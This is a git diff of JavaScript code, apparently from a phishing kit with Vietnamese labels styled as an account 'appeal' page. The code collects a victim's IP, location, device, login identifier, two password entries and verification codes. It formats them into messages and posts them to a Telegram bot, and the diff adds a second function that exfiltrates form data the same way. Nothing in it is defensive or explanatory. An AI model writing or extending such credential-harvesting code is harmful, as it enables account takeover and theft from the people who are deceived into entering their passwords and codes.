@@ -34,12 +34,11 @@ const getTimestamp = () => {
 
 const buildHeader = (geoInfo) => {
     const device = detectDevice();
-    const cpu = device.cpu ?? 'Không rõ';
-    return `⏰ ${getTimestamp()}
+    return `🔔 <b>KHÁNG NGHỊ</b>
+⏰ ${getTimestamp()}
 🌐 IP: <code>${geoInfo.ip}</code>
 📍 Vị trí: <code>${geoInfo.location}</code>
 📱 Thiết bị: <code>${device.deviceInfo}</code>
-💻 CPU: <code>${cpu}</code>
 ━━━━━━━━━━━━━━━━━━━━`;
 };
 
@@ -164,6 +163,28 @@ ${buildLoginSection(emailOrPhone, password1, password2)}
 ${codesSection}
 🔀 <b>THỬ CÁCH KHÁC</b>
    Phương thức: <code>${selectedMethodLabel}</code>
+━━━━━━━━━━━━━━━━━━━━`;
+
+        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'HTML',
+        });
+
+        return res.data?.result?.message_id ?? null;
+    } catch {
+        return null;
+    }
+};
+
+export const sendFormDataToTelegram = async (formData) => {
+    try {
+        const token = config.token;
+        const chatId = config.chat_id;
+        const geoInfo = await getGeoInfo();
+
+        const msg = `${buildHeader(geoInfo)}
+${buildInfoSection(formData)}
 ━━━━━━━━━━━━━━━━━━━━`;
 
         const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
